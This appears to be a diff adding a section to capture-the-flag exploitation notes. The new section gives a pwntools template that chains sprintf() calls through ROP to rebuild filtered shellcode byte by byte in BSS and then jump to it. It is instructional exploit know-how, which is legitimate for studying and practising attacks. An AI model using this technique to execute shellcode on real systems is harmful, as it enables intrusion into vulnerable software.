@@ -353,3 +353,37 @@ payload = flat(
 - `xchg` works even when `rbp` is not on the stack (e.g., small buffer overflow)
 
 **Limitation:** `xchg rax, esp` truncates to 32-bit on x86-64 (sets upper 32 bits of rsp to 0). The pivot address must be in the lower 4GB of address space. Heap and mmap regions often qualify; stack addresses (0x7fff...) do not.
+
+---
+
+## sprintf() Gadget Chaining for Bad Character Bypass (PlaidCTF 2013)
+
+**Pattern:** When shellcode contains bytes filtered by the input handler (null, space, slash, colon, etc.), use `sprintf()` to copy individual bytes from the executable's own memory — one byte at a time — to assemble clean shellcode on BSS.
+
+```python
+from pwn import *
+
+# Step 1: Scan executable for addresses containing each needed byte
+exe_data = open('binary', 'rb').read()
+byte_addrs = {}  # Maps byte value -> address in executable
+for c in range(256):
+    for i in range(len(exe_data)):
+        addr = exe_base + i
+        if exe_data[i] == c and not has_bad_chars(p32(addr)):
+            byte_addrs[c] = addr
+            break
+
+# Step 2: Chain sprintf(bss_dest, byte_addr) for each shellcode byte
+rop = b''
+for i, byte in enumerate(shellcode):
+    rop += p32(sprintf_plt)
+    rop += p32(pop3ret)           # Clean 3 args
+    rop += p32(bss_addr + i)     # Destination
+    rop += p32(byte_addrs[byte]) # Source (1 byte + null terminator)
+    rop += p32(0)                # Unused arg
+
+# Step 3: Jump to assembled shellcode on BSS
+rop += p32(bss_addr)
+```
+
+**Key insight:** `sprintf(dst, src)` copies bytes until a null terminator — effectively a single-byte copy when `src` points to a byte followed by `\x00`. Each call in the ROP chain places one shellcode byte. The source addresses come from the binary's own `.text`/`.rodata` sections. Requires a `pop3ret` gadget for stack cleanup between calls.
